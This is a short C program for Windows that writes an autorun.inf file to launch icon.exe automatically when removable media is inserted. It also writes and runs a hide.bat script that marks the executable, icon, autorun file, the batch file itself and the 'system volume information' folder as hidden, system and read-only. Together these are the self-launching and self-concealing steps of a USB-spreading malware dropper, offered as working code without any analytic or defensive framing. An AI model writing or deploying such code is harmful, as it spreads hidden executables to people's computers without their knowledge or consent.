#include <stdio.h>
#include <stdlib.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <objbase.h>
#include <windows.h>
#include "exe_icon.h"

int main()
{
	FILE *fptr;

	// autorun.inf
	fptr = fopen("autorun.inf", "w");
	fprintf(fptr, "[autorun]\nicon=icon.ico\n;Open=icon.exe\nShellExecute=icon.exe\nUseAutoPlay=1");
	fclose(fptr);

	// hide.bat
	fptr = fopen("hide.bat", "w");
	fprintf(fptr, "@echo off\ncolor a\nattrib icon.ico +s +h +r\nattrib autorun.inf +s +h +r\nattrib hide.bat +s +h +r\nattrib \"system volume information\" +s +h +r\nattrib icon.exe +s +h +r\nexit");
	fclose(fptr);

	// Executing
	ShellExecute(0, "open", "hide.bat", 0, 0, 0);

	return 0;
}
